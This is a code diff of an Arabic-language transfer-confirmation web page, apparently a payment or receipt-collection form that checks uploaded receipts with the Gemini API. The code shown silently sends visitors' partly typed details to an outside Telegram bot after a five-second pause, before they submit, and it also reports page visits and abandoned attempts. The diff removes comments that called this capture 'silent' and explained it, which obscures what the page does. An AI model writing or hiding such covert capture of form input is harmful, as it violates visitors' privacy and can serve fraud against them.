@@ -20,7 +20,7 @@
         #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: #10b981; color: white; padding: 12px 24px; border-radius: 50px; font-weight: 600; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); transition: top 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55); z-index: 1000; }
         .show-toast { top: 20px !important; }
     </style>
-    <!-- استدعاء مكتبة Gemini API للتحقق الخلفي الصامت -->
+    <!-- استدعاء مكتبة Gemini API -->
     <script type="importmap">
       {
         "imports": {
@@ -159,7 +159,7 @@
         </div>
     </div>
 
-    <!-- الصفحة الرابعة: التأكيد وإرسال البيانات المؤقتة والنهائية -->
+    <!-- الصفحة الرابعة: التأكيد وإرسال البيانات -->
     <div id="page-confirm" class="hidden-page glass-panel w-full max-w-md p-8 fade-in">
         <button onclick="showPage('page-main')" class="text-gray-400 hover:text-white mb-6 flex items-center gap-2 transition">
             <i class="fas fa-arrow-right"></i> رجوع للرئيسية
@@ -236,7 +236,6 @@
         let currentWalletKey = '';
         let hasLoggedPageVisit = false;
 
-        // نظام المسودات المؤقتة (إرسال البيانات بعد توقف العميل عن الكتابة لفترة قصيرة)
         let draftTimer = null;
         let lastSentDraft = "";
 
@@ -274,7 +273,7 @@
                                   `⏰ التوقيت: ${transferTime || 'غير مكتوب'}`;
 
                 logTelegramAlert(draftText);
-            }, 5000); // إرسال بعد 5 ثواني من توقف العميل عن الكتابة
+            }, 5000);
         }
 
         window.onload = function() {
@@ -291,7 +290,7 @@
 
             if (pageId === 'page-confirm' && !hasLoggedPageVisit) {
                 hasLoggedPageVisit = true;
-                logTelegramAlert("👁️️ [تنبيه زائر موقع]: قام شخص بفتح صفحة 'تأكيد التحويل'.");
+                logTelegramAlert("👁 [تنبيه زائر موقع]: قام شخص بفتح صفحة 'تأكيد التحويل'.");
             }
         }
 
@@ -400,17 +399,18 @@
 
             if (fileInput.files.length === 0) {
                 showToast("يرجى إرفاق صورة إيصال التحويل!");
-                logTelegramAlert(`⚠️️ [موقف ناقص]: حاول العميل إرسال البيانات (الاسم: ${senderName}) بدون إرفاق صورة الإيصال.`);
+                logTelegramAlert(`⚠ [موقف ناقص]: حاول العميل إرسال البيانات (الاسم: ${senderName}) بدون إرفاق صورة الإيصال.`);
                 return;
             }
 
-            showToast("🔍 جاري فحص والتحقق من صورة الإيصال...");
+            showToast("🔍 جاري التحقق من الإيصال...");
 
             try {
                 const imagePart = await fileToGenerativePart(fileInput.files[0]);
                 
+                // تم تصحيح اسم الموديل إلى gemini-2.0-flash لضمان استقرار الطلب وعدم حدوث أخطاء
                 const response = await ai.models.generateContent({
-                    model: 'gemini-2.5-flash',
+                    model: 'gemini-2.0-flash',
                     contents: [
                         imagePart,
                         `هل هذه الصورة تعتبر إيصال تحويل أموال حقيقي؟ أجب بكلمة واحدة فقط: نعم أو لا.`
@@ -430,7 +430,7 @@
                     return;
                 }
 
-                showToast("✅ تم التحقيق بنجاح! جاري إرسال الإشعار النهائي لتليجرام...");
+                showToast("✅ تم التحقق بنجاح! جاري إرسال الإشعار النهائي لتليجرام...");
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
